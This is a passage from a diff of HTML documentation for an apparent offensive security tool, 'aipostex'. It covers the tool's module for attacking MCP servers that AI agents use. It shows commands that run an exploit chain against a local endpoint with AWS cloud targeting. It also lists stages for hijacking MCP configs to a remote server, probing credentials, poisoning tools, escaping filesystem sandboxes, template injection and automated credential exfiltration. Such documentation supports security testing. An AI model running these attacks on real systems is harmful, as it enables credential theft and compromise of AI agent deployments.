+<a id="__codelineno-8-55" name="__codelineno-8-55" href="#__codelineno-8-55"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>chain<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-56" name="__codelineno-8-56" href="#__codelineno-8-56"></a><span class="w">  </span>--cloud<span class="w"> </span>aws<span class="w"> </span>--force-exploit
 </code></pre></div>
 <h2 id="transport-compatibility">Transport Compatibility<a class="headerlink" href="#transport-compatibility" title="Permanent link">&para;</a></h2>
 <p>The MCP client supports three transport modes:</p>
@@ -5125,20 +5266,20 @@
 </tbody>
 </table>
 <p>Run templates against an MCP endpoint:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>./aipostex<span class="w"> </span>scan<span class="w"> </span>targets<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>--tags<span class="w"> </span>mcp
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>./aipostex<span class="w"> </span>scan<span class="w"> </span>targets<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>--tags<span class="w"> </span>mcp
 </code></pre></div>
 <p>See <a href="../../vuln-templates/builtin/">Built-in Templates</a> for the full template reference.</p>
 <h2 id="workflow-progression">Workflow Progression<a class="headerlink" href="#workflow-progression" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>discover network / discover files (discovers MCP config or endpoint)
-<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>  → scan targets --tags mcp (run vulnerability templates)
-<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>  → mcp analyze --config &lt;path&gt; (local config analysis)
-<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    → mcp config-hijack --config &lt;path&gt; --url &lt;remote-mcp-url&gt; --force-exploit (verified local config write)
-<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>  → mcp enum --target &lt;url&gt; (remote tool enumeration)
-<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>    → mcp env-extract (credential probing, read-only)
-<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>    → mcp poison --mode &lt;mode&gt; (exploit validation, gated)
-<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>    → mcp sandbox-escape (filesystem read-tool path escape, gated)
-<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>    → mcp ssti (rendering-tool template injection, gated)
-<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>    → mcp chain (automated credential exfiltration, gated)
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>discover network / discover files (discovers MCP config or endpoint)
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>  → scan targets --tags mcp (run vulnerability templates)
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>  → mcp analyze --config &lt;path&gt; (local config analysis)
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>    → mcp config-hijack --config &lt;path&gt; --url &lt;remote-mcp-url&gt; --force-exploit (verified local config write)
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>  → mcp enum --target &lt;url&gt; (remote tool enumeration)
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>    → mcp env-extract (credential probing, read-only)
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>    → mcp poison --mode &lt;mode&gt; (exploit validation, gated)
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>    → mcp sandbox-escape (filesystem read-tool path escape, gated)
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>    → mcp ssti (rendering-tool template injection, gated)
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>    → mcp chain (automated credential exfiltration, gated)
 </code></pre></div>
 
 
